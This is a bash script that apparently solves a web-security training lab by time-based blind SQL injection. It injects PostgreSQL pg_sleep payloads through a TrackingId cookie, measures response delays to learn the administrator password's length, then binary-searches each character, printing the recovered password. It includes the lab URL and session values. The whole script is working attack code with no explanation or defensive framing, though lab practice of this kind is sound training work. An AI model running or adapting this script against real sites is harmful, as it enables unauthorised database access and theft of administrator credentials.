#!/bin/bash

gcc conv.c -o conv

URL='https://0a2100bc0372153282583e6c008c005c.web-security-academy.net/'
TRACKING_ID='OK4olZYYXoi7A4aR'
SESSION='6Tz8BgK4Be73JXlRVlSKqy8waipFjvEK'

d=0
n=0
while [ $d -lt 10 ]
do
n=`expr $n + 1`
LENGTH_PAYLOAD="%27%3b SELECT CASE WHEN LENGTH(password) = $n THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--"
start_time=$(date +%s%N)
resp=$(curl -s $URL --cookie "TrackingId=$TRACKING_ID$LENGTH_PAYLOAD; session=$SESSION")
end_time=$(date +%s%N)
d=$((($end_time-$start_time)/1000000000))
done

echo "Password length: $n"

CONST_LEFT=33
CONST_RIGHT=127
for (( i=1; i<=$n; i++ ))
do
LEFT_BOUND=$CONST_LEFT
RIGHT_BOUND=$CONST_RIGHT
CHARACTER=$((($LEFT_BOUND + $RIGHT_BOUND) / 2 ))
while [ $LEFT_BOUND != $RIGHT_BOUND ]
do
CHARACTER_PAYLOAD="%27%3b SELECT CASE WHEN SUBSTR(password, $i, 1) > '$(./conv $CHARACTER)' THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username = 'administrator'--"
start_time=$(date +%s%N)
resp=$(curl -s $URL --cookie "TrackingId=$TRACKING_ID$CHARACTER_PAYLOAD; session=$SESSION")
end_time=$(date +%s%N)
d=$((($end_time-$start_time)/1000000000))

if [ $d -ge 10 ];
then
LEFT_BOUND=`expr $CHARACTER + 1`
else
RIGHT_BOUND=$CHARACTER
fi;
CHARACTER=$((($LEFT_BOUND + $RIGHT_BOUND) / 2 ))
done

echo -n $(./conv $CHARACTER)
done
